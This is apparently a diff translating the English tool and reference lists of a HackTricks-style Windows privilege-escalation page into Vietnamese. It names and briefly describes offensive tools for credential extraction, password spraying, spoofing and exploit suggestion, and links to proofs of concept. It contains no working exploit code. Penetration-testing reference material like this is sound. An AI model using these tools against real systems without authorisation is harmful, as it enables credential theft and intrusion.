 [**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
-[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Check for misconfigurations and sensitive files (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
-[**JAWS**](https://github.com/411Hall/JAWS) **-- Check for some possible misconfigurations and gather info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
-[**privesc** ](https://github.com/enjoiz/Privesc)**-- Check for misconfigurations**\
-[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. Use -Thorough in local.**\
-[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extracts credentials from Credential Manager. Detected.**\
-[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray gathered passwords across domain**\
-[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS spoofer and man-in-the-middle tool.**\
-[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
-[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Search for known privesc vulnerabilities (DEPRECATED for Watson)\
-[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**
+[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Kiểm tra các cấu hình sai và file nhạy cảm (**[**xem tại đây**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Đã bị phát hiện.**\
+[**JAWS**](https://github.com/411Hall/JAWS) **-- Kiểm tra một số cấu hình sai có thể có và thu thập thông tin (**[**xem tại đây**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
+[**privesc** ](https://github.com/enjoiz/Privesc)**-- Kiểm tra cấu hình sai**\
+[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Trích xuất thông tin phiên đã lưu của PuTTY, WinSCP, SuperPuTTY, FileZilla và RDP. Dùng -Thorough khi chạy cục bộ.**\
+[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Trích xuất credential từ Credential Manager. Đã bị phát hiện.**\
+[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Thử spray các mật khẩu đã thu thập được trên toàn domain**\
+[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh là công cụ PowerShell giả mạo ADIDNS/LLMNR/mDNS và man-in-the-middle.**\
+[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Công cụ liệt kê Windows cơ bản phục vụ privesc**\
+[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Tìm các lỗ hổng privesc đã biết (ĐÃ LỖI THỜI, thay bằng Watson)\
+[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Kiểm tra cục bộ **(Cần quyền Admin)**
 
 **Exe**
 
-[**Watson**](https://github.com/rasta-mouse/Watson) -- Search for known privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
-[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerates the host searching for misconfigurations (more a gather info tool than privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
-[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extracts credentials from lots of software (precompiled exe in github)**\
-[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port of PowerUp to C#**\
-[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Check for misconfiguration (executable precompiled in github). Not recommended. It does not work well in Win10.\
-[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Check for possible misconfigurations (exe from python). Not recommended. It does not work well in Win10.
+[**Watson**](https://github.com/rasta-mouse/Watson) -- Tìm các lỗ hổng privesc đã biết (cần được biên dịch bằng VisualStudio) ([**bản biên dịch sẵn**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
+[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Liệt kê host để tìm cấu hình sai (thiên về công cụ thu thập thông tin hơn là privesc) (cần được biên dịch) **(**[**bản biên dịch sẵn**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
+[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Trích xuất credential từ nhiều phần mềm (có file exe biên dịch sẵn trên github)**\
+[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Bản port của PowerUp sang C#**\
+[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Kiểm tra cấu hình sai (có file executable biên dịch sẵn trên github). Không khuyến nghị. Công cụ này hoạt động không tốt trên Win10.\
+[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Kiểm tra các cấu hình sai có thể có (exe từ Python). Không khuyến nghị. Công cụ này hoạt động không tốt trên Win10.
 
 **Bat**
 
-[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool created based in this post (it does not need accesschk to work properly but it can use it).
+[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Công cụ được tạo dựa trên bài viết này (không cần accesschk để hoạt động bình thường, nhưng có thể sử dụng nó).
 
 **Local**
 
-[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Reads the output of **systeminfo** and recommends working exploits (local python)\
-[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Reads the output of **systeminfo** and recommends working exploits (local Python)
+[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Đọc đầu ra của **systeminfo** và đề xuất các exploit có thể hoạt động (Python chạy cục bộ)\
+[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Đọc đầu ra của **systeminfo** và đề xuất các exploit có thể hoạt động (Python chạy cục bộ)
 
 **Meterpreter**
 
 _multi/recon/local_exploit_suggestor_
 
-You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
+Bạn cần biên dịch project bằng đúng phiên bản .NET ([xem tại đây](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Để xem phiên bản .NET đã cài đặt trên host nạn nhân, bạn có thể chạy:
 
 ```
 C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
@@ -2636,49 +2635,48 @@ C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the 
 
 ## References
 
-- [1] [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)
-- [2] [Elevating privileges by exploiting weak folder permissions](http://www.greyhathacker.net/?p=738)
-- [3] [Windows Privilege Escalation - a cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
-- [4] [lpeworkshop - Windows / Linux Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
-- [5] [DerbyCon 3.0 - Windows Attacks: AT is the new black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
-- [6] [Privilege Escalation - Windows - Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
-- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
-- [8] [Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
-- [9] [Windows-Privilege-Escalation checklist](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
-- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
-- [11] [Windows Privilege Escalation Methods for Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
-- [12] [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
-- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
-- [14] [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
-- [15] [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
-- [16] [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
-- [17] [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
+- [1] [Kiến thức cơ bản về leo thang đặc quyền trên Windows](http://www.fuzzysecurity.com/tutorials/16.html)
+- [2] [Leo thang đặc quyền bằng cách khai thác quyền thư mục yếu](http://www.greyhathacker.net/?p=738)
+- [3] [Leo thang đặc quyền trên Windows - bảng tổng hợp](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
+- [4] [lpeworkshop - Workshop leo thang đặc quyền cục bộ trên Windows / Linux](https://github.com/sagishahar/lpeworkshop)
+- [5] [DerbyCon 3.0 - Tấn công Windows: AT là xu hướng mới (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
+- [6] [Leo thang đặc quyền - Windows - Hướng dẫn OSCP toàn diện](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
+- [7] [Windows - Leo thang đặc quyền - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+- [8] [Hướng dẫn leo thang đặc quyền trên Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
+- [9] [Danh sách kiểm tra leo thang đặc quyền trên Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
+- [10] [Leo thang đặc quyền trên Windows](https://github.com/frizb/Windows-Privilege-Escalation)
+- [11] [Các phương pháp leo thang đặc quyền trên Windows dành cho pentester](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
+- [12] [0xdf – HTB/VulnLab JobTwo: Lừa đảo bằng macro Word VBA qua SMTP → giải mã thông tin xác thực hMailServer → Veeam CVE-2023-27532 lên SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
+- [13] [HTB Reaper: leak chuỗi định dạng + stack BOF → VirtualAlloc ROP (RCE) và đánh cắp kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
+- [14] [Check Point Research – Truy lùng Silver Fox: cuộc rượt đuổi giữa mèo và chuột trong bóng tối kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
+- [15] [Unit 42 – Lỗ hổng hệ thống tệp có đặc quyền trong một hệ thống SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
+- [16] [Công cụ kiểm thử symbolic link – cách sử dụng CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
+- [17] [Liên kết về quá khứ: Lạm dụng symbolic link trên Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
 - [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
-- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
-- [20] [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
-- [21] [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
+- [19] [RegPwn BOF (bản chuyển sang Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
+- [20] [ZDI - Node.js Trust Falls: Phân giải module nguy hiểm trên Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
+- [21] [Module Node.js: tải từ các thư mục `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
 - [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
 - [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
-- [24] [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
-- [25] [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
+- [24] [Trail of Bits - Các thử thách trong danh sách kiểm tra C/C++, lời giải](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
+- [25] [Microsoft Learn - Hàm RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
 - [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
 - [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
-- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
-- [29] [Pwn2Own with Microslop: Chaining CLDFLT and DirectX Kernel Race Conditions for Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
-- [30] [One I/O Ring to Rule Them All: A Full Read/Write Exploit Primitive on Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
-- [31] [Abusing Arbitrary File Deletes to Escalate Privilege and Other Great Tricks](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
-- [32] [thezdi/PoC - FilesystemEoPs exploit code](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
-- [33] [GoSecure – WSUS Attacks Part 2: CVE-2020-1013, a Windows 10 Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
-- [34] [Windows 7: Exploring Credential Manager and Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
-- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
-- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation When An Image Change Leads To A Privilege Escalation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
-- [37] [blog.ropnop.com - Extracting Ssh Private Keys From Windows 10 Ssh Agent](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
-- [38] [SpecterOps – Turning Enterprise Update Servers Into Backdoor Factories (0_o) – Part 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
-- [39] [SpecterOps – Turning Enterprise Update Servers Into Backdoor Factories (0_o) – Part 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
+- [28] [sec-zone - Chiếm quyền các tệp nhị phân dịch vụ](https://github.com/sec-zone/Hijack-service-binaries)
+- [29] [Pwn2Own với Microslop: Kết hợp điều kiện race CLDFLT và DirectX Kernel để leo thang đặc quyền cục bộ trên Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
+- [30] [Một I/O Ring thống trị tất cả: primitive khai thác đọc/ghi toàn diện trên Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
+- [31] [Lạm dụng thao tác xóa tệp tùy ý để leo thang đặc quyền và các thủ thuật hữu ích khác](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
+- [32] [thezdi/PoC - Mã khai thác FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
+- [33] [GoSecure – Tấn công WSUS Phần 2: CVE-2020-1013, lỗ hổng leo thang đặc quyền cục bộ trên Windows 10 dạng 1-day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
+- [34] [Windows 7: Khám phá Credential Manager và Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
+- [35] [jas502n - PoC CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
+- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Khi thay đổi image dẫn đến leo thang đặc quyền](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
+- [37] [blog.ropnop.com - Trích xuất SSH private key từ SSH agent trên Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
+- [38] [SpecterOps – Biến máy chủ cập nhật doanh nghiệp thành nhà máy tạo backdoor (0_o) – Phần 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
+- [39] [SpecterOps – Biến máy chủ cập nhật doanh nghiệp thành nhà máy tạo backdoor (0_o) – Phần 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
 - [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
-- [41] [Exodus Intelligence - Microsoft Windows Installer Folder Delete Privilege Escalation](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
+- [41] [Exodus Intelligence - Leo thang đặc quyền bằng cách xóa thư mục Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
 - [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
-- [43] [MDSec - Total Recall: Retracing Your Steps Back to NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
-- [44] [NCC Group - Windows MIDI Services shared-memory offsets privilege escalation advisory](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
-
+- [43] [MDSec - Total Recall: Lần theo dấu vết để trở lại NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
+- [44] [NCC Group - Tư vấn về lỗ hổng leo thang đặc quyền do offset bộ nhớ dùng chung trong Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
 {{#include ../../banners/hacktricks-training.md}}
